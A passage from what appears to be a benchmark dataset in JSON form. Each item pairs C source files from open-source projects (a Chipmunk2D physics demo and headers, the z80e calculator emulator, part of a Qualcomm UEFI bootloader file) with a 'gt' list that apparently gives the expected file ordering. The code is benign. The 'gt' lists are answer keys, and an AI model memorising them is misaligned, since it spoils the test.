cell_i && j == cell_j) &&\n\t\t\t\tcpShapePointQuery(shape, cell, NULL) < 0.0f\n\t\t\t){\n\t\t\t\tcount = ClipCell(shape, cell, i, j, context, ping, pong, count);\n\t\t\t\tmemcpy(ping, pong, count*sizeof(cpVect));\n\t\t\t}\n\t\t}\n\t}\n\n\tcpVect centroid = cpCentroidForPoly(count, ping);\n\tcpFloat mass = cpAreaForPoly(count, ping, 0.0f)*DENSITY;\n\tcpFloat moment = cpMomentForPoly(mass, count, ping, cpvneg(centroid), 0.0f);\n\n\tcpBody *new_body = cpSpaceAddBody(space, cpBodyNew(mass, moment));\n\tcpBodySetPosition(new_body, centroid);\n\tcpBodySetVelocity(new_body, cpBodyGetVelocityAtWorldPoint(body, centroid));\n\tcpBodySetAngularVelocity(new_body, cpBodyGetAngularVelocity(body));\n\n\tcpTransform transform = cpTransformTranslate(cpvneg(centroid));\n\tcpShape *new_shape = cpSpaceAddShape(space, cpPolyShapeNew(new_body, count, ping, transform, 0.0));\n\n\tcpShapeSetFriction(new_shape, cpShapeGetFriction(shape));\n}\n\nstatic void\nShatterShape(cpSpace *space, cpShape *shape, cpFloat cellSize, cpVect focus)\n{\n\tcpSpaceRemoveShape(space, shape);\n\tcpSpaceRemoveBody(space, cpShapeGetBody(shape));\n\n\tcpBB bb = cpShapeGetBB(shape);\n\tint width = (int)((bb.r - bb.l)/cellSize) + 1;\n\tint height = (int)((bb.t - bb.b)/cellSize) + 1;\n\n\tstruct WorleyContex context = {rand(), cellSize, width, height, bb, focus};\n\n\tfor(int i=0; i<context.width; i++){\n\t\tfor(int j=0; j<context.height; j++){\n\t\t\tcpVect cell = WorleyPoint(i, j, &context);\n\t\t\tif(cpShapePointQuery(shape, cell, NULL) < 0.0f){\n\t\t\t\tShatterCell(space, shape, cell, i, j, &context);\n\t\t\t}\n\t\t}\n\t}\n\n\tcpBodyFree(cpShapeGetBody(shape));\n\tcpShapeFree(shape);\n}\n\nstatic void\nupdate(cpSpace *space, double dt)\n{\n\tcpSpaceStep(space, dt);\n\n\tif(ChipmunkDemoRightDown){\n\t\tcpPointQueryInfo info;\n\t\tif(cpSpacePointQueryNearest(space, ChipmunkDemoMouse, 0, GRAB_FILTER, &info)){\n\t\t\tcpBB bb = cpShapeGetBB(info.shape);\n\t\t\tcpFloat cell_size = cpfmax(bb.r - bb.l, bb.t - bb.b)/5.0f;\n\t\t\tif(cell_size > 5.0f){\n\t\t\t\tShatterShape(space, (cpShape *)info.shape, cell_size, ChipmunkDemoMouse);\n\t\t\t} else {\n\n\t\t\t}\n\t\t}\n\t}\n}\n\nstatic cpSpace *\ninit(void)\n{\n\tChipmunkDemoMessageString = \"Right click something to shatter it.\";\n\n\tcpSpace *space = cpSpaceNew();\n\tcpSpaceSetIterations(space, 30);\n\tcpSpaceSetGravity(space, cpv(0, -500));\n\tcpSpaceSetSleepTimeThreshold(space, 0.5f);\n\tcpSpaceSetCollisionSlop(space, 0.5f);\n\n\tcpBody *body, *staticBody = cpSpaceGetStaticBody(space);\n\tcpShape *shape;\n\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-1000, -240), cpv( 1000, -240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tcpFloat width = 200.0f;\n\tcpFloat height = 200.0f;\n\tcpFloat mass = width*height*DENSITY;\n\tcpFloat moment = cpMomentForBox(mass, width, height);\n\n\tbody = cpSpaceAddBody(space, cpBodyNew(mass, moment));\n\n\tshape = cpSpaceAddShape(space, cpBoxShapeNew(body, width, height, 0.0));\n\tcpShapeSetFriction(shape, 0.6f);\n\n\treturn space;\n}\n\nstatic void\ndestroy(cpSpace *space)\n{\n\tChipmunkDemoFreeSpaceChildren(space);\n\tcpSpaceFree(space);\n}\n\nChipmunkDemo Shatter = {\n\t\"Shatter.\",\n\t1.0f/60.0f,\n\tinit,\n\tupdate,\n\tChipmunkDemoDefaultDrawImpl,\n\tdestroy,\n};\n\n'Chipmunk2D/include/chipmunk/cpPivotJoint.h'\n:\n\n\n\n\n\nCP_EXPORT cpBool cpConstraintIsPivotJoint(const cpConstraint *constraint);\n\n\nCP_EXPORT cpPivotJoint* cpPivotJointAlloc(void);\n\nCP_EXPORT cpPivotJoint* cpPivotJointInit(cpPivotJoint *joint, cpBody *a, cpBody *b, cpVect anchorA, cpVect anchorB);\n\nCP_EXPORT cpConstraint* cpPivotJointNew(cpBody *a, cpBody *b, cpVect pivot);\n\nCP_EXPORT cpConstraint* cpPivotJointNew2(cpBody *a, cpBody *b, cpVect anchorA, cpVect anchorB);\n\n\nCP_EXPORT cpVect cpPivotJointGetAnchorA(const cpConstraint *constraint);\n\nCP_EXPORT void cpPivotJointSetAnchorA(cpConstraint *constraint, cpVect anchorA);\n\n\nCP_EXPORT cpVect cpPivotJointGetAnchorB(const cpConstraint *constraint);\n\nCP_EXPORT void cpPivotJointSetAnchorB(cpConstraint *constraint, cpVect anchorB);\n\n\n\n'Chipmunk2D/include/chipmunk/cpConstraint.h'\n:\n\n\n\n\n\ntypedef void (*cpConstraintPreSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\ntypedef void (*cpConstraintPostSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\n\nCP_EXPORT void cpConstraintDestroy(cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintFree(cpConstraint *constraint);\n\n\nCP_EXPORT cpSpace* cpConstraintGetSpace(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyA(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyB(const cpConstraint *constraint);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxForce(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxForce(cpConstraint *constraint, cpFloat maxForce);\n\n\nCP_EXPORT cpFloat cpConstraintGetErrorBias(const cpConstraint *constraint);\n\n\n\nCP_EXPORT void cpConstraintSetErrorBias(cpConstraint *constraint, cpFloat errorBias);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxBias(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxBias(cpConstraint *constraint, cpFloat maxBias);\n\n\nCP_EXPORT cpBool cpConstraintGetCollideBodies(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetCollideBodies(cpConstraint *constraint, cpBool collideBodies);\n\n\nCP_EXPORT cpConstraintPreSolveFunc cpConstraintGetPreSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPreSolveFunc(cpConstraint *constraint, cpConstraintPreSolveFunc preSolveFunc);\n\n\nCP_EXPORT cpConstraintPostSolveFunc cpConstraintGetPostSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPostSolveFunc(cpConstraint *constraint, cpConstraintPostSolveFunc postSolveFunc);\n\n\nCP_EXPORT cpDataPointer cpConstraintGetUserData(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetUserData(cpConstraint *constraint, cpDataPointer userData);\n\n\nCP_EXPORT cpFloat cpConstraintGetImpulse(cpConstraint *constraint);\n\n#include \"cpPinJoint.h\"\n#include \"cpSlideJoint.h\"\n#include \"cpPivotJoint.h\"\n#include \"cpGrooveJoint.h\"\n#include \"cpDampedSpring.h\"\n#include \"cpDampedRotarySpring.h\"\n#include \"cpRotaryLimitJoint.h\"\n#include \"cpRatchetJoint.h\"\n#include \"cpGearJoint.h\"\n#include \"cpSimpleMotor.h\"\n\n\n\n'Chipmunk2D/include/chipmunk/chipmunk.h'\n:\n\n#ifndef CHIPMUNK_H\n#define CHIPMUNK_H\n\n#include <stdlib.h>\n#include <math.h>\n\n#ifndef alloca\n\t#ifdef _WIN32\n\t\t#include <malloc.h>\n\t#elif defined(__FreeBSD__)\n\n\t#else\n\t\t#include <alloca.h>\n\t#endif\n#endif\n\n#ifdef _WIN32\n\t#define CP_EXPORT __declspec(dllexport)\n#else\n\t#define CP_EXPORT\n#endif\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nCP_EXPORT void cpMessage(const char *condition, const char *file, int line, int isError, int isHardError, const char *message, ...);\n#ifdef NDEBUG\n\t#define\tcpAssertWarn(__condition__, ...)\n\t#define\tcpAssertSoft(__condition__, ...)\n#else\n\t#define cpAssertSoft(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 0, __VA_ARGS__); abort();}\n\t#define cpAssertWarn(__condition__, ...) if(!(__condition__)) cpMessage(#__condition__, __FILE__, __LINE__, 0, 0, __VA_ARGS__)\n#endif\n\n\n#define cpAssertHard(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 1, __VA_ARGS__); abort();}\n\n#include \"chipmunk_types.h\"\n\n\n\n\n\n#ifndef CP_BUFFER_BYTES\n\t#define CP_BUFFER_BYTES (32*1024)\n#endif\n\n#ifndef cpcalloc\n\n\t#define cpcalloc calloc\n#endif\n\n#ifndef cprealloc\n\n\t#define cprealloc realloc\n#endif\n\n#ifndef cpfree\n\n\t#define cpfree free\n#endif\n\ntypedef struct cpArray cpArray;\ntypedef struct cpHashSet cpHashSet;\n\ntypedef struct cpBody cpBody;\n\ntypedef struct cpShape cpShape;\ntypedef struct cpCircleShape cpCircleShape;\ntypedef struct cpSegmentShape cpSegmentShape;\ntypedef struct cpPolyShape cpPolyShape;\n\ntypedef struct cpConstraint cpConstraint;\ntypedef struct cpPinJoint cpPinJoint;\ntypedef struct cpSlideJoint cpSlideJoint;\ntypedef struct cpPivotJoint cpPivotJoint;\ntypedef struct cpGrooveJoint cpGrooveJoint;\ntypedef struct cpDampedSpring cpDampedSpring;\ntypedef struct cpDampedRotarySpring cpDampedRotarySpring;\ntypedef struct cpRotaryLimitJoint cpRotaryLimitJoint;\ntypedef struct cpRatchetJoint cpRatchetJoint;\ntypedef struct cpGearJoint cpGearJoint;\ntypedef struct cpSimpleMotorJoint cpSimpleMotorJoint;\n\ntypedef struct cpCollisionHandler cpCollisionHandler;\ntypedef struct cpContactPointSet cpContactPointSet;\ntypedef struct cpArbiter cpArbiter;\n\ntypedef struct cpSpace cpSpace;\n\n#include \"cpVect.h\"\n#include \"cpBB.h\"\n#include \"cpTransform.h\"\n#include \"cpSpatialIndex.h\"\n\n#include \"cpArbiter.h\"\n\n#include \"cpBody.h\"\n#include \"cpShape.h\"\n#include \"cpPolyShape.h\"\n\n#include \"cpConstraint.h\"\n\n#include \"cpSpace.h\"\n\n\n#define CP_VERSION_MAJOR 7\n#define CP_VERSION_MINOR 0\n#define CP_VERSION_RELEASE 3\n\n\nCP_EXPORT extern const char *cpVersionString;\n\n\n\nCP_EXPORT cpFloat cpMomentForCircle(cpFloat m, cpFloat r1, cpFloat r2, cpVect offset);\n\n\n\nCP_EXPORT cpFloat cpAreaForCircle(cpFloat r1, cpFloat r2);\n\n\n\nCP_EXPORT cpFloat cpMomentForSegment(cpFloat m, cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpAreaForSegment(cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpMomentForPoly(cpFloat m, int count, const cpVect *verts, cpVect offset, cpFloat radius);\n\n\n\nCP_EXPORT cpFloat cpAreaForPoly(const int count, const cpVect *verts, cpFloat radius);\n\n\nCP_EXPORT cpVect cpCentroidForPoly(const int count, const cpVect *verts);\n\n\nCP_EXPORT cpFloat cpMomentForBox(cpFloat m, cpFloat width, cpFloat height);\n\n\nCP_EXPORT cpFloat cpMomentForBox2(cpFloat m, cpBB box);\n\n\n\n\n\nCP_EXPORT int cpConvexHull(int count, const cpVect *verts, cpVect *result, int *first, cpFloat tol);\n\n\n\n\n\n#define CP_CONVEX_HULL(__count__, __verts__, __count_var__, __verts_var__) \\\ncpVect *__verts_var__ = (cpVect *)alloca(__count__*sizeof(cpVect)); \\\nint __count_var__ = cpConvexHull(__count__, __verts__, __verts_var__, NULL, 0.0); \\\n\n\nstatic inline cpVect\ncpClosetPointOnSegment(const cpVect p, const cpVect a, const cpVect b)\n{\n\tcpVect delta = cpvsub(a, b);\n\tcpFloat t = cpfclamp01(cpvdot(delta, cpvsub(p, b))/cpvlengthsq(delta));\n\treturn cpvadd(b, cpvmult(delta, t));\n}\n\n#if defined(__has_extension)\n#if __has_extension(blocks)\n\n\n\n\nvoid cpSpaceEachBody_b(cpSpace *space, void (^block)(cpBody *body));\nvoid cpSpaceEachShape_b(cpSpace *space, void (^block)(cpShape *shape));\nvoid cpSpaceEachConstraint_b(cpSpace *space, void (^block)(cpConstraint *constraint));\n\nvoid cpBodyEachShape_b(cpBody *body, void (^block)(cpShape *shape));\nvoid cpBodyEachConstraint_b(cpBody *body, void (^block)(cpConstraint *constraint));\nvoid cpBodyEachArbiter_b(cpBody *body, void (^block)(cpArbiter *arbiter));\n\ntypedef void (^cpSpacePointQueryBlock)(cpShape *shape, cpVect point, cpFloat distance, cpVect gradient);\nvoid cpSpacePointQuery_b(cpSpace *space, cpVect point, cpFloat maxDistance, cpShapeFilter filter, cpSpacePointQueryBlock block);\n\ntypedef void (^cpSpaceSegmentQueryBlock)(cpShape *shape, cpVect point, cpVect normal, cpFloat alpha);\nvoid cpSpaceSegmentQuery_b(cpSpace *space, cpVect start, cpVect end, cpFloat radius, cpShapeFilter filter, cpSpaceSegmentQueryBlock block);\n\ntypedef void (^cpSpaceBBQueryBlock)(cpShape *shape);\nvoid cpSpaceBBQuery_b(cpSpace *space, cpBB bb, cpShapeFilter filter, cpSpaceBBQueryBlock block);\n\ntypedef void (^cpSpaceShapeQueryBlock)(cpShape *shape, cpContactPointSet *points);\ncpBool cpSpaceShapeQuery_b(cpSpace *space, cpShape *shape, cpSpaceShapeQueryBlock block);\n\n#endif\n#endif\n\n\n\n\n#ifdef __cplusplus\n}\n\nstatic inline cpVect operator *(const cpVect v, const cpFloat s){return cpvmult(v, s);}\nstatic inline cpVect operator +(const cpVect v1, const cpVect v2){return cpvadd(v1, v2);}\nstatic inline cpVect operator -(const cpVect v1, const cpVect v2){return cpvsub(v1, v2);}\nstatic inline cpBool operator ==(const cpVect v1, const cpVect v2){return cpveql(v1, v2);}\nstatic inline cpVect operator -(const cpVect v){return cpvneg(v);}\n\n#endif\n#endif\n",
        "gt": [
            "'Chipmunk2D/include/chipmunk/cpPivotJoint.h'",
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/demo/Shatter.c'"
        ]
    },
    {
        "files": [
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/src/ti/asic.c'",
            "'z80e/libz80e/include/z80e/ti/hardware/link.h'"
        ],
        "content": "'z80e/libz80e/include/z80e/ti/asic.h'\n:#ifndef ASIC_H\n#define ASIC_H\n\n#include <stdint.h>\n#ifndef NOLINK\n#include <poll.h>\n#endif\n\ntypedef struct asic asic_t;\n\n#include <z80e/core/cpu.h>\n#include <z80e/log/log.h>\n#include <z80e/ti/memory.h>\n#include <z80e/ti/ti.h>\n#include <z80e/runloop/runloop.h>\n#include <z80e/debugger/hooks.h>\n#include <z80e/debugger/debugger.h>\n#include <z80e/ti/hardware/interrupts.h>\n\ntypedef enum {\n\tBATTERIES_REMOVED,\n\tBATTERIES_LOW,\n\tBATTERIES_GOOD\n} battery_state;\n\n\ntypedef void (*timer_tick)(asic_t *, void *);\ntypedef struct z80_hardware_timers z80_hardware_timers_t;\ntypedef struct z80_hardware_timer z80_hardware_timer_t;\ntypedef struct z80_link_socket z80_link_socket_t;\n\nenum {\n\tTIMER_IN_USE = (1 << 0),\n\tTIMER_ONE_SHOT = (1 << 1)\n};\n\nstruct z80_hardware_timer {\n\tint cycles_until_tick;\n\n\tint flags;\n\tdouble frequency;\n\ttimer_tick on_tick;\n\tvoid *data;\n};\n\nstruct z80_hardware_timers {\n\tint max_timers;\n\tz80_hardware_timer_t *timers;\n};\n\nstruct z80_link_socket {\n#ifndef NOLINK\n\tint accept;\n\tstruct pollfd listenfd;\n\tstruct pollfd clients[10];\n#endif\n};\n\nstruct asic {\n\tint stopped;\n\tti_device_type device;\n\tbattery_state battery;\n\tint battery_remove_check;\n\tint clock_rate;\n\n\tz80cpu_t* cpu;\n\trunloop_state_t *runloop;\n\tti_mmu_t* mmu;\n\tti_interrupts_t *interrupts;\n\tz80_hardware_timers_t *timers;\n\tz80_link_socket_t *link;\n\thook_info_t *hook;\n\tlog_t *log;\n\tdebugger_t *debugger;\n};\n\nasic_t* asic_init(ti_device_type, log_t *);\nvoid asic_free(asic_t*);\n\nint asic_set_clock_rate(asic_t *, int);\n\nint asic_add_timer(asic_t *, int, double, timer_tick, void *);\nvoid asic_remove_timer(asic_t *, int);\n\n#endif\n\n'z80e/libz80e/include/z80e/debugger/hooks.h'\n:#ifndef DEBUGGER_HOOKS_H\n#define DEBUGGER_HOOKS_H\n\n#include <stdint.h>\n\ntypedef struct hook_info hook_info_t;\n\n#include <z80e/ti/asic.h>\n#include <z80e/core/registers.h>\n#include <z80e/ti/hardware/t6a04.h>\n\nhook_info_t *create_hook_set(asic_t *asic);\n\n\n\nuint8_t hook_on_memory_read(hook_info_t *, uint16_t address, uint8_t value);\nuint8_t hook_on_memory_write(hook_info_t *, uint16_t address, uint8_t value);\n\ntypedef uint8_t (*hook_memory_callback)(void *data, uint16_t address, uint8_t value);\n\nvoid hook_remove_memory_read(hook_info_t *, int);\nint hook_add_memory_read(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_memory_write(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\n\n\n\nuint16_t hook_on_register_read(hook_info_t *, registers flags, uint16_t value);\nuint16_t hook_on_register_write(hook_info_t *, registers flags, uint16_t value);\n\ntypedef uint16_t (*hook_register_callback)(void *data, registers reg, uint16_t value);\n\nvoid hook_remove_register_read(hook_info_t *, int);\nint hook_add_register_read(hook_info_t *, registers flags, void *data, hook_register_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_register_write(hook_info_t *, registers flags, void *data, hook_register_callback);\n\n\n\nuint8_t hook_on_port_in(hook_info_t *, uint8_t port, uint8_t value);\nuint8_t hook_on_port_out(hook_info_t *, uint8_t port, uint8_t value);\n\ntypedef uint8_t (*hook_port_callback)(void *data, uint8_t port, uint8_t value);\n\nvoid hook_remove_port_in(hook_info_t *, int);\nint hook_add_port_in(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\nvoid hook_remove_port_out(hook_info_t *, int);\nint hook_add_port_out(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\n\n\n\nvoid hook_on_before_execution(hook_info_t *, uint16_t address);\nvoid hook_on_after_execution(hook_info_t *, uint16_t address);\n\ntypedef void (*hook_execution_callback)(void *data, uint16_t address);\n\nvoid hook_remove_before_execution(hook_info_t *, int);\nint hook_add_before_execution(hook_info_t *, void *data, hook_execution_callback);\nvoid hook_remove_after_execution(hook_info_t *, int);\nint hook_add_after_execution(hook_info_t *, void *data, hook_execution_callback);\n\n\n\nvoid hook_on_lcd_update(hook_info_t *, ti_bw_lcd_t *);\n\ntypedef void (*hook_lcd_update_callback)(void *data, ti_bw_lcd_t *lcd);\n\nvoid hook_remove_lcd_update(hook_info_t *, int);\nint hook_add_lcd_update(hook_info_t *, void *data, hook_lcd_update_callback);\n\n#endif\n\n'z80e/libz80e/src/ti/asic.c'\n:#include \"ti/asic.h\"\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"log/log.h\"\n#include \"core/cpu.h\"\n#include \"ti/memory.h\"\n#include \"ti/hardware/t6a04.h\"\n#include \"ti/hardware/speed.h\"\n#include \"ti/hardware/memorymapping.h\"\n#include \"ti/hardware/keyboard.h\"\n#include \"ti/hardware/status.h\"\n#include \"ti/hardware/flash.h\"\n#include \"ti/hardware/link.h\"\n#include \"ti/hardware/timers.h\"\n\ntypedef struct {\n\tasic_t *asic;\n\tuint8_t port;\n} unimplemented_device_t;\n\nuint8_t read_unimplemented_port(void *device) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to read from unimplemented port 0x%02x from 0x%04X.\", d->port, d->asic->cpu->registers.PC);\n\treturn 0x00;\n}\n\nvoid write_unimplemented_port(void *device, uint8_t value) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to write 0x%02x to unimplemented port 0x%02x from 0x%04X.\", value, d->port, d->asic->cpu->registers.PC);\n}\n\nvoid plug_devices(asic_t *asic) {\n\n\tint i;\n\tfor (i = 0; i < 0x100; i++) {\n\t\tunimplemented_device_t *d = malloc(sizeof(unimplemented_device_t));\n\t\td->asic = asic;\n\t\td->port = i;\n\t\tz80iodevice_t device = { d, read_unimplemented_port, write_unimplemented_port };\n\t\tasic->cpu->devices[i] = device;\n\t}\n\n\tasic->cpu->devices[0x01] = init_keyboard();\n\tasic->cpu->devices[0x02] = init_status(asic);\n\tasic->cpu->devices[0x03] = init_interrupts(asic, &asic->interrupts);\n\tsetup_lcd_display(asic, asic->hook);\n\n\tif (asic->device != TI73 && asic->device != TI83p) {\n\t\tasic->cpu->devices[0x20] = init_speed(asic);\n\t\tinit_crystal_timers(asic);\n\t}\n\n\tinit_link_ports(asic);\n\tinit_mapping_ports(asic);\n\tinit_flash_ports(asic);\n}\n\nvoid asic_null_write(void *ignored, uint8_t value) {}\n\nvoid asic_mirror_ports(asic_t *asic) {\n\tint i;\n\tswitch (asic->device) {\n\tcase TI83p:\n\t\tfor (i = 0x08; i < 0x10; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tasic->cpu->devices[0x12] = asic->cpu->devices[0x10];\n\t\tasic->cpu->devices[0x13] = asic->cpu->devices[0x11];\n\t\tasic->cpu->devices[0x15] = asic->cpu->devices[0x05];\n\t\tasic->cpu->devices[0x15].write_out = asic_null_write;\n\t\tfor (i = 0x17; i < 0x100; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tfor (i = 0x60; i < 0x80; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i - 0x20];\n\t\t}\n\t\tbreak;\n\t}\n}\n\nvoid free_devices(asic_t *asic) {\n\n\tfree_keyboard(asic->cpu->devices[0x01].device);\n\tfree_status(asic->cpu->devices[0x02]);\n\tfree_mapping_ports(asic);\n}\n\nasic_t *asic_init(ti_device_type type, log_t *log) {\n\tasic_t* device = calloc(1, sizeof(asic_t));\n\tdevice->log = log;\n\tdevice->cpu = cpu_init(log);\n\tdevice->mmu = ti_mmu_init(type, log);\n\tdevice->cpu->memory = (void*)device->mmu;\n\tdevice->cpu->read_byte = ti_read_byte;\n\tdevice->cpu->write_byte = ti_write_byte;\n\tdevice->battery = BATTERIES_GOOD;\n\tdevice->device = type;\n\tdevice->clock_rate = 6000000;\n\n\tdevice->timers = calloc(1, sizeof(z80_hardware_timers_t));\n\tdevice->timers->max_timers = 20;\n\tdevice->timers->timers = calloc(20, sizeof(z80_hardware_timer_t));\n\n\tdevice->stopped = 0;\n\tdevice->debugger = 0;\n\tdevice->runloop = runloop_init(device);\n\tdevice->hook = create_hook_set(device);\n\n\tdevice->link = calloc(1, sizeof(z80_link_socket_t));\n\n\tplug_devices(device);\n\tasic_mirror_ports(device);\n\treturn device;\n}\n\nvoid asic_free(asic_t* device) {\n\tti_mmu_free(device->mmu);\n\tfree_devices(device);\n\tcpu_free(device->cpu);\n\tfree(device);\n}\n\nint asic_add_timer(asic_t *asic, int flags, double frequency, timer_tick tick, void *data) {\n\tz80_hardware_timer_t *timer = 0;\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tif (!(asic->timers->timers[i].flags & TIMER_IN_USE)) {\n\t\t\ttimer = &asic->timers->timers[i];\n\t\t\tbreak;\n\t\t}\n\n\t\tif (i == asic->timers->max_timers - 1) {\n\t\t\tasic->timers->max_timers += 10;\n\t\t\tasic->timers->timers = realloc(asic->timers->timers, sizeof(z80_hardware_timer_t) * asic->timers->max_timers);\n\t\t\tz80_hardware_timer_t *ne = &asic->timers->timers[asic->timers->max_timers - 10];\n\t\t\tmemset(ne, 0, sizeof(z80_hardware_timer_t) * 10);\n\t\t}\n\t}\n\n\ttimer->cycles_until_tick = asic->clock_rate / frequency;\n\ttimer->flags = flags | TIMER_IN_USE;\n\ttimer->frequency = frequency;\n\ttimer->on_tick = tick;\n\ttimer->data = data;\n\treturn i;\n}\n\nvoid asic_remove_timer(asic_t *asic, int index) {\n\tasic->timers->timers[index].flags &= ~TIMER_IN_USE;\n}\n\nint asic_set_clock_rate(asic_t *asic, int new_rate) {\n\tint old_rate = asic->clock_rate;\n\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tz80_hardware_timer_t *timer = &asic->timers->timers[i];\n\t\tif (timer->flags & TIMER_IN_USE) {\n\t\t\ttimer->cycles_until_tick =\n\t\t\t\tnew_rate / (timer->cycles_until_tick * timer->frequency);\n\t\t}\n\t}\n\n\tasic->clock_rate = new_rate;\n\treturn old_rate;\n}\n\n'z80e/libz80e/include/z80e/ti/hardware/link.h'\n:#ifndef LINK_H\n#define LINK_H\n\n#include <z80e/ti/asic.h>\n#include <stdbool.h>\n\ntypedef struct {\n\tasic_t *asic;\n\tstruct {\n\t\tuint8_t tip\t\t: 1;\n\t\tuint8_t ring\t: 1;\n\t} them;\n\tstruct {\n\t\tuint8_t tip\t\t: 1;\n\t\tuint8_t ring\t: 1;\n\t} us;\n\tunion {\n\t\tuint8_t mask;\n\t\tstruct {\n\t\t\tuint8_t rx\t\t\t: 1;\n\t\t\tuint8_t tx\t\t\t: 1;\n\t\t\tuint8_t error\t\t: 1;\n\t\t\tuint8_t \t\t\t: 4;\n\t\t\tuint8_t disabled\t: 1;\n\t\t};\n\t} interrupts;\n\tstruct {\n\t\tuint8_t rx_buffer;\n\t\tuint8_t tx_buffer;\n\t\tunion {\n\t\t\tstruct {\n\t\t\t\tuint8_t int_rx_ready\t: 1;\n\t\t\t\tuint8_t int_tx_ready\t: 1;\n\t\t\t\tuint8_t int_error\t\t: 1;\n\t\t\t\tuint8_t rx_active\t\t: 1;\n\t\t\t\tuint8_t rx_ready\t\t: 1;\n\t\t\t\tuint8_t tx_ready\t\t: 1;\n\t\t\t\tuint8_t error\t\t\t: 1;\n\t\t\t\tuint8_t tx_active\t\t: 1;\n\t\t\t};\n\t\t\tuint8_t u8;\n\t\t} status;\n\t} assist;\n\tbool la_ready;\n} link_state_t;\n\nvoid init_link_ports(asic_t *asic);\nvoid free_link_ports(asic_t *asic);\n\nbool link_recv_byte(asic_t *asic, uint8_t val);\n\nint link_read_tx_buffer(asic_t *asic);\n\nbool link_recv_ready(asic_t *asic);\n\n#endif\n",
        "gt": [
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/include/z80e/ti/hardware/link.h'",
            "'z80e/libz80e/src/ti/asic.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/DeviceInfo.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIPmicVersion.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Board.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/DeviceInfo.c'\n:\n#include \"AutoGen.h\"\n#include \"LinuxLoaderLib.h\"\n#include \"Board.h\"\n#include <FastbootLib/FastbootCmds.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PartitionTableUpdate.h>\n#include <Library/Recovery.h>\n#include <Library/StackCanary.h>\n\nSTATIC DeviceInfo DevInfo;\nSTATIC BOOLEAN FirstReadDevInfo = TRUE;\n\nBOOLEAN IsUnlocked (VOID)\n{\n  return DevInfo.is_unlocked;\n}\n\nBOOLEAN IsUnlockCritical (VOID)\n{\n  return DevInfo.is_unlock_critical;\n}\n\nBOOLEAN IsEnforcing (VOID)\n{\n  return DevInfo.verity_mode;\n}\n\nBOOLEAN IsChargingScreenEnable (VOID)\n{\n  return DevInfo.is_charger_screen_enabled;\n}\n\nVOID\nGetDevInfo (DeviceInfo **DevInfoPtr)\n{\n  *DevInfoPtr = &DevInfo;\n}\nVOID\nGetBootloaderVersion (CHAR8 *BootloaderVersion, UINT32 Len)\n{\n  AsciiSPrint (BootloaderVersion, Len, \"%a\", DevInfo.bootloader_version);\n}\n\nVOID\nGetRadioVersion (CHAR8 *RadioVersion, UINT32 Len)\n{\n  AsciiSPrint (RadioVersion, Len, \"%a\", DevInfo.radio_version);\n}\n\nEFI_STATUS\nEnableChargingScreen (BOOLEAN IsEnabled)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (IsChargingScreenEnable () != IsEnabled) {\n    DevInfo.is_charger_screen_enabled = IsEnabled;\n\n  }\n\n  return Status;\n}\n\nEFI_STATUS\nStoreDisplayCmdLine (CONST CHAR8 *CmdLine, UINT32 